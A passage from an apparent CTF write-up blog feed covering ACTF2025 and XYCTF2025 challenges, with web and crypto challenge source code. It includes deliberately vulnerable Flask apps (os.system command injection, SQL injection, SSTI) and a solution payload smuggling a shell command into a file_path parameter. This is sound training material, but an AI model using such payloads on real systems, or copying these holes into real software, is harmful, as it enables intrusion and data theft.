request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_path = <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;_&#x27;</span> + f.filename</span><br><span class="line">        f.save(<span class="string">&#x27;./uploads/&#x27;</span> + file_path)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/upload?file_path=<span class="subst">&#123;file_path&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;file_path&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path = <span class="string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="string">&#x27;file_path&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    content = f.read()</span><br><span class="line">                    b64 = base64.b64encode(content)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.system(<span class="string">f&#x27;base64 <span class="subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="subst">&#123;file_path&#125;</span>.b64&#x27;</span>)</span><br><span class="line">                <span class="comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line">                <span class="comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><code>admin</code><strong></strong><code>passwd-EN-Top10000</code><code>backdoor</code></p><p><strong></strong><code>file_path</code><strong>admin</strong><strong></strong><strong></strong></p><p><strong>admin</strong><strong></strong></p><p><strong>admin: /upload?file_path=;cat /Fl4g_is_H3r3 &gt; ./uploads/flag;#</strong><br /><strong>/upload?file_path=flag</strong></p><h2 id="excellent-site"><a class="markdownIt-Anchor" href="#excellent-site"></a> Excellent-Site*</h2><blockquote><p>My site is PERFECT!!!<br />hosts: 0.0.0.0 <a href="http://ezmail.org">ezmail.org</a></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib </span><br><span class="line"><span class="keyword">import</span> imaplib</span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> decode_header</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_subjects</span>(<span class="params">username, password</span>):</span><br><span class="line">    imap_server = <span class="string">&quot;ezmail.org&quot;</span></span><br><span class="line">    imap_port = <span class="number">143</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mail = imaplib.IMAP4(imap_server, imap_port)</span><br><span class="line">        mail.login(username, password)</span><br><span class="line">        mail.select(<span class="string">&quot;inbox&quot;</span>)</span><br><span class="line">        status, messages = mail.search(<span class="literal">None</span>, <span class="string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> status != <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        subject = <span class="string">&quot;&quot;</span></span><br><span class="line">        latest_email = messages[<span class="number">0</span>].split()[-<span class="number">1</span>]</span><br><span class="line">        status, msg_data = mail.fetch(latest_email, <span class="string">&quot;(RFC822)&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response_part <span class="keyword">in</span> msg_data:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(response_part, <span class="built_in">tuple</span>):</span><br><span class="line">                msg = email.message_from_bytes(response_part  [<span class="number">1</span>])</span><br><span class="line">                subject, encoding = decode_header(msg[<span class="string">&quot;Subject&quot;</span>])  [<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(subject, <span class="built_in">bytes</span>):</span><br><span class="line">                    subject = subject.decode(encoding <span class="keyword">if</span> encoding <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        mail.logout()</span><br><span class="line">        <span class="keyword">return</span> subject</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_page_content</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parsed_url = urlparse(url)</span><br><span class="line">        <span class="keyword">if</span> parsed_url.scheme != <span class="string">&#x27;http&#x27;</span> <span class="keyword">or</span> parsed_url.hostname != <span class="string">&#x27;ezmail.org&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;SSRF Attack!&quot;</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/report&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        url = request.form[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        content = request.form[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">        smtplib._quote_periods = <span class="keyword">lambda</span> x: x</span><br><span class="line">        mail_content = <span class="string">&quot;&quot;&quot;From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server = smtplib.SMTP(<span class="string">&quot;ezmail.org&quot;</span>)</span><br><span class="line">            mail_content = smtplib._fix_eols(mail_content)</span><br><span class="line">            mail_content = mail_content.<span class="built_in">format</span>(url=url, content=content)</span><br><span class="line">            server.sendmail(<span class="string">&quot;ignored@ezmail.org&quot;</span>, <span class="string">&quot;admin@ezmail.org&quot;</span>, mail_content)</span><br><span class="line">            message = <span class="string">&quot;Submitted! Now wait till the end of the world.&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            message = <span class="string">&quot;Send FAILED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;report.html&quot;</span>, message=message)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    requests.get(<span class="string">&quot;http://ezmail.org:3000/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;The admin is checking your advice(maybe)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> ip != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden IP&quot;</span></span><br><span class="line">    subject = get_subjects(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;p@ssword&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> subject.startswith(<span class="string">&quot;http://ezmail.org&quot;</span>):</span><br><span class="line">        page_content = fetch_page_content(subject)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;<span class="subst">&#123;page_content&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news_id = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> news_id:</span><br><span class="line">        news_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;news.db&quot;</span>)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">f&quot;SELECT title FROM news WHERE id = <span class="subst">&#123;news_id&#125;</span>&quot;</span>)</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Page not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p><code>/admin</code><code>SSTI</code></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="easy_log"><a class="markdownIt-Anchor" href="#easy_log"></a> easy_log*</h2><blockquote><p>E@sy L0g</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> alarm</span><br><span class="line"></span><br><span class="line">Point = namedtuple(<span class="string">&quot;Point&quot;</span>, <span class="string">&quot;x y&quot;</span>)</span><br><span class="line">O = <span class="string">&quot;Origin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_addition</span>(<span class="params">P, Q, n</span>):</span><br><span class="line"><span class="keyword">if</span> P == O:</span><br><span class="line"><span class="keyword">return</span> Q</span><br><span class="line"><span class="keyword">if</span> Q == O:</span><br><span class="line"><span class="keyword">return</span> P</span><br><span class="line">x = (P.x * Q.y + P.y * Q.x - P.x * Q.x) % n</span><br><span class="line">y = (P.x * Q.x + P.y * Q.y) % n</span><br><span class="line"><span class="keyword">return</span> Point(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_and_add</span>(<span class="params">k, P, n</span>):</span><br><span class="line">Q = P</span><br><span class="line">R = O</span><br><span class="line"><span class="keyword">while</span>(k &gt; <span class="number">0</span>):</span><br><span class="line"><span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">R = point_addition(R, Q, n)</span><br><span class="line">k &gt;&gt;= <span class="number">1</span></span><br><span class="line">Q = point_addition(Q, Q, n)</span><br><span class="line"><span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">50</span></span><br><span class="line">flag = urandom(randint(<span class="number">38</span>, <span class="number">48</span>)) + flag</span><br><span class="line">flag = flag + urandom(<span class="number">118</span> - <span class="built_in">len</span>(flag))</span><br><span class="line"></span><br><span class="line">flag1, flag2 = bytes_to_long(flag[:<span class="number">68</span>]), bytes_to_long(flag[<span class="number">68</span>:])</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x231d5fa471913e79facfd95e9b874e2d499def420e0914fab5c9f87e71c2418d1194066bd8376aa8f02ef35c1926f73a46477cd4a88beae89ba575bb3e1b04271426c6706356dd8cd9aa742d7ad0343f8939bfd2110d45122929d29dc022da26551e1ed7000</span></span><br><span class="line">G1 = Point(<span class="number">0xf22b9343408c5857048a19150c8fb9fd44c25d7f6decabc10bf46a2250a128f0df15adc7b82c70c0acaf855c0e898b141c9c94ba8aef8b67ea298c6d9fd870ea70e1c4f8a1b595d15373dc6db25a4ecddf626a64f47beba5538b7f733e4aa0c4f1fd4c291d</span>, <span class="number">0x8d3264514b7fdbce97fbaedb33120c7889a1af59691a1947c2c7061347c091b0950ca36efaa704514004a988b9b87b24f5cebf2d1c7bef44ff172519e1a62eb62cde234c94bd0ab39375d7ddb42e044090c8db46d3f965ef7e4753bc41dac3b8b3ae0cdb57</span>)</span><br><span class="line">G2 = Point(<span class="number">0x81919777837d3e5065c6f7f6801fe29544180be9db2137f075f53ebb3307f917183c6fc9cdfc5d75977f7</span>, <span class="number">0xd1a586d6848caa3a5436a86d903516d83808ce2fa49c5fb3f183ecb855e961c7e816a7ba8f588ef947f19</span>)</span><br><span class="line"></span><br><span class="line">f1 = double_and_add(flag1, G1, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f1)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag1 != <span class="built_in">int</span>(<span class="built_in">input</span>()):</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> p.bit_length() == <span class="number">400</span></span><br><span class="line"></span><br><span class="line">f2 = double_and_add(flag2, G2, p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f2)</span><br></pre></td></tr></table></figure><h2 id="aaalll"><a class="markdownIt-Anchor" href="#aaalll"></a> AAALLL*</h2><blockquote><p>Lets welcome AAAs LLL master!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice, sample</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_ternery_poly</span>(<span class="params">Q</span>):</span><br><span class="line">    <span class="keyword">return</span> Q([choice([-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(Q.degree())])</span><br><span class="line"></span><br><span class="line">n = <span class="number">450</span></span><br><span class="line">p = <span class="number">3774877201</span></span><br><span class="line">t = n//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">g = x^n+<span class="number">1</span></span><br><span class="line">roots = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> g.roots()]</span><br><span class="line"></span><br><span class="line">subset = sample(roots, t)</span><br><span class="line"></span><br><span class="line">Q.&lt;x&gt; = P.quotient(x^n+<span class="number">1</span>)</span><br><span class="line">f = sample_ternery_poly(Q)</span><br><span class="line">f_lift = f.lift()</span><br><span class="line">values = [f_lift(i) <span class="keyword">for</span> i <span class="keyword">in</span> subset]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;subset: <span class="subst">&#123;subset&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;values: <span class="subst">&#123;values&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = md5(<span class="built_in">str</span>(f.<span class="built_in">list</span>()).encode()).digest()</span><br><span class="line">aes = AES.new(key = key, mode = AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct: <span class="subst">&#123;aes.encrypt(pad(flag, <span class="number">16</span>))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">subset: [1040018022, 3719840057, 2086762603, 3065369513, 3179320758, 891114580, 966265556, 664146925, 1232096603, 1449704729, 2810118429, 2891821810, 698162894, 3070228878, 3114653287, 2793650430, 2941920517, 1811454265, 325024118, 1860481904, 555392385, 2818572232, 3719972491, 981226771, 1777524396, 2717373523, 3694549306, 91210020, 1397236365, 2806262125, 1966653548, 1369610707, 3545263790, 595556443, 1601356313, 2865921937, 2795518764, 1690002428, 3501122295, 2078440315, 1222414863, 1997352805, 271758023, 3348936352, 1800648013, 410072905, 3378691273, 185134810, 1281817316, 821730517, 2855781188, 3353349707, 273754906, 1187616168, 569728457, 401428606, 3671298095, 149603298, 2300569286, 1057503678, 1915386614, 2716934671, 2005635066, 389589525, 2691165686, 586877133, 2874838, 660954102, 3258633701, 1083711515, 1785913794, 3410290851, 1914395297, 2544074509, 3076714307, 2169463229, 2654223166, 3648299978, 3188000068, 1130206965, 875184747, 2549126013, 3602874619, 80327895, 983400559, 2423201604, 3384400899, 654136379, 1835112234, 3302809337, 3388376496, 364586350, 3219484816, 52162306, 3488542302, 2843511894, 638341256, 427235375, 757491483, 3364804296, 172002582, 3112473265, 2746078509, 2118542465, 421527494, 3017385718, 3683667181, 3536621837, 3113923099, 1989065494, 1769242135, 1541932517, 1963422936, 2341204092, 3306256995, 186750428, 1381468653, 1288011784, 229613411, 839241230, 425544589, 2345390466, 2552462338, 286334899, 2984993503, 3741109364, 103579106, 138703348, 2369990075, 2377640836, 1279106009, 2542780598, 1653097443, 3373448595, 2405266494, 3385287676, 289622793, 2376573706, 3096235437, 1971476669, 3449853083, 3565565810, 762810383, 272826480, 516243500, 1710511548, 3233762177, 2013126070, 224313638, 1884110819, 3141861971, 2014729696, 1572103482, 2232944684, 2644670236, 1350302342, 3589742391, 2106163918, 1077036824, 3527373372, 2474464298, 971863088, 1219963894, 3349332612, 1474307915, 905651245, 2666266327, 2192845472, 2748042118, 1489782942, 1300412903, 126577223, 545427793, 360417066, 704648323, 3562938536, 908955264, 1108610874, 247503829, 2379959160, 1059927520, 2869225956, 2202773719, 1498564318, 2032958616, 3485254408, 1091224495, 3287849020, 780873181, 3410363615, 1398303495, 2426564739, 487028181, 1230802692, 139226346, 789883698, 2557862280, 2994004020, 3205148744, 2914199937, 1803400532, 2738281702, 883055391, 1761751131, 1220550272, 1947825121, 3543565567, 1939764967, 2986882625, 798323428, 1120654035, 3722714895, 3679983602, 364513586, 1760147505, 472067864, 2393408548, 2239781327, 799334306, 3497260623, 2769084221, 860677264, 990410164, 3772002363, 2883762621]</span></span><br><span class="line"><span class="string">values: [712538976, 1225537965, 2633482204, 1245652635, 2529155164, 1672980719, 3024410928, 1535384351, 2252244320, 672919726, 2976916118, 3089453551, 2512277279, 2431400831, 1129198075, 3441247454, 610984549, 2043949242, 3306515233, 2759625250, 2459507335, 2885552592, 3226187015, 983312810, 1815610133, 871259259, 3651562935, 570267317, 2548725905, 70380481, 685470168, 1925389996, 2466124957, 1512923993, 2603725653, 409457162, 859041441, 3193931087, 786021320, 2481319115, 2379423262, 1972220678, 251474531, 448830331, 3189297419, 845468707, 3014186402, 1476144624, 1412175603, 464556671, 1251535251, 2252149066, 3501165225, 1173484383, 1168113959, 2547845342, 3132683037, 182880838, 3236782773, 637440805, 1077834200, 910992912, 1281164705, 763525563, 1025793488, 3031918542, 2457090411, 159146268, 3252417067, 1695150089, 1863899429, 2660689081, 647461624, 3736679821, 2034134877, 973654854, 1545264273, 692989149, 769387639, 2024000598, 2916906076, 1996631367, 2889527392, 527082343, 3319918691, 3629378248, 685639382, 2659312228, 472574946, 1237496521, 434512296, 3649895972, 3500730074, 1092276151, 1513927060, 1179642291, 474879861, 1132457849, 3072787035, 1536862618, 3131879287, 1635514910, 2467715064, 2377496874, 2888951190, 3697148067, 1885811970, 1037114846, 2862197847, 2248493059, 829223452, 17390497, 1063920331, 2504310664, 2269937803, 667770896, 1855657371, 323906741, 2972650844, 3620395133, 2613325861, 2508686438, 2143229100, 977352912, 3380653143, 2367018411, 1665354812, 2473914413, 3531805346, 2023595772, 1909192693, 844059686, 2233570033, 1997039839, 3558799006, 2872633369, 1949018254, 3159312415, 3021409934, 2505867881, 2357897866, 3436059930, 1496867815, 594001374, 3433203342, 2396280741, 2696363547, 1775021594, 434891096, 862244228, 1372573410, 3003385341, 3051290794, 493688483, 2143128679, 394087901, 3668481745, 1085467544, 2438896216, 1782052147, 2415529482, 149721114, 1539904401, 1902915995, 1929333694, 1759980967, 2106193398, 3670877657, 2736025727, 3133082490, 182590224, 1099952929, 3522052498, 2206338880, 1925988633, 3440533747, 25471854, 325651518, 72348028, 3178620735, 3335468600, 818634602, 2932340363, 1163855672, 2453716531, 373827915, 2373018915, 2231504345, 2975884007, 3636085022, 2354093635, 2696203979, 799834661, 2412088324, 1446875965, 3299868618, 302142905, 1957341475, 1522953201, 1257060525, 3769499753, 1591149900, 295691418, 3249943297, 1280379656, 1164820140, 115871117, 219831260, 2505969457, 2618672354, 2781617927, 2886486193, 1648555579, 1265576372, 1720183485, 2424145699, 2772052592, 2399827477, 626825210, 2422432913, 322266950, 2157976175, 2208875362, 2216568965, 3223085486]</span></span><br><span class="line"><span class="string">ct: b&#x27;&quot;\xf2Y\xf0\x15\xc5x\x94\xb9E\xbd\xd3\xa7\xb1\xad\x00\xa2D*+\x87BQ_20\x87\xa2\nP\xfc\xce\x0eW\xaf\xd8-.\xb5\xfai\xf1\xf6*\xben^\xd5&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> reference</h1><ul><li><a href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup"></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#misc&quot;&gt;&lt;/a&gt; Misc&lt;/h1&gt;
&lt;h2 id=&quot;signin&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#signin&quot;&gt;&lt;/a&gt; sign</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/</id>
    <published>2025-04-07T19:19:43.000Z</published>
    <updated>2025-04-07T19:57:44.085Z</updated>
    
    <content type="html"><![CDATA[<p>*<strong></strong></p><p><a href="https://gz.imxbt.cn/games/23"></a></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="division"><a class="markdownIt-Anchor" href="#division"></a> Division</h2><blockquote><p>LamentXUadwa&gt;_&lt;</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   server.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/20 12:25:03</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----Welcome to my division calc----&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">menu:</span></span><br><span class="line"><span class="string">      [1]  Division calc</span></span><br><span class="line"><span class="string">      [2]  Get flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nominator = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ans = <span class="built_in">input</span>(<span class="string">&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">            rand1 = random.getrandbits(<span class="number">11000</span>)</span><br><span class="line">            rand2 = random.getrandbits(<span class="number">10000</span>)</span><br><span class="line">            correct_ans = rand1 // rand2</span><br><span class="line">            <span class="keyword">if</span> correct_ans == <span class="built_in">int</span>(ans):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;WOW&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Here is your flag: <span class="subst">&#123;f.read()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;NOPE, the correct answer is <span class="subst">&#123;correct_ans&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span 